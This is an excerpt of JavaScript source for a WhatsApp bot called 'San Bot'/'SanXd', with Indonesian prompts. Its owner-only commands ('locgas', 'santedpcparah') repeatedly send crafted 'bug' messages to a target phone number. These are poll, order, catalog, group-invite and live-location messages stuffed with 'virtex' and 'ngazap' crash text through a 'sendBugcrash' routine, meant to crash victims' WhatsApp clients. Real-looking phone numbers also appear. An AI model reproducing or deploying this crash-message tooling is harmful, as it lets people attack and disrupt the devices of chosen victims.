...
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: '6282114680993@s.whatsapp.net' } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
...
"fileName": `San Bot WhatsApp${ngazap(prefix)}`,
...
"message": {
"pollCreationMessage": {
"name": `San Bot ${virus}${virtex(prefix)}`,
"options": [
	{
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `San Bot WhatsApp${ngazap(prefix)}`,
"orderTitle": "San Bot WhatsApp${ngazap(prefix)}",
...
const botzkayla = "6282114680993@s.whatsapp.net"
...
owned = '6282114680993@s.whatsapp.net'
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
...
case 'addprem':
if (!itsMeKayla) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6282114680993`)
...
contextInfo:{
"externalAdReply": {
"title": `San Bot ${virus}${virtex(prefix)}`,
"body": `San Bot ${virus}${virtex(prefix)}`,
mimetype: 'audio/mpeg', 
caption: `San Bot WhatsApp${ngazap(prefix)}`,
showAdAttribution: true,
...
case 'locgas':{
if (!itsMeKayla) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285793433348`)
...
"caption": `San Bot ${virus}${virtex(prefix)}`,
...
jumlah = '3'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(num, `San Bot ${virus}${virtex(prefix)}`, `San Bot ${virus}${virtex(prefix)}`, `San Bot ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
...
"title": `San Bot WhatsApp ${virus} ${virtex(prefix)}`,
...
jumlah = '3'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(m.chat, `San Bot ${virus}${virtex(prefix)}`, `San Bot ${virus}${virtex(prefix)}`, `San Bot ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
...
Message: { 
extendedTextMessage: { 
text: `SanXd Bot ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
...
case 'santedpcparah': 
if (!itsMeKayla) return reply(mess.owner)
if (!q) return reply(`Contoh ${command} 6285793433348`)
...
var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6282114680993@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-SanXd ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyauser, caption: `ৡৢ͜͡𝟒𝟎𝟒-SanXd ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
...
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-SanXd ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
for (let i = 0; i < jumlah; i++) {
...
kayla.sendKatalog(numt, `ৡৢ͜͡𝟒𝟎𝟒-SanXd ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-SanXd ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ppnyauser, { quoted: lep })
...
"name": `SanXd Bot WhatsApp ${virus}`,
"address": `Created By SanXd ${virtex(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
...
let e = String(err)
sendKaylaMessage("6282114680993@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki " + util.format(e), 
contextInfo:{
forwardingScore: 5, 
isForwarded: true
}})
